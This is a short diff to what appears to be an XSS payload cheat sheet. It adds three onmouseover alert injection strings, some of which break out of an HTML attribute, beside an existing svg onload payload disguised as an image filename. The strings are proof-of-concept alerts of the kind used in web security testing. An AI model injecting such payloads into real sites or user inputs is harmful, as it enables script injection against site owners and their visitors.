@@ -71,6 +71,10 @@ Classic XSS Alert Payloads :)
 
 	'<svg onload=alert(document.domain)>.jpg'
 
+        '"><h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
+        '<h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
+	'">onmouseover=alert(1)'
+
 
 	XSS Bypass by Url Encoding
 
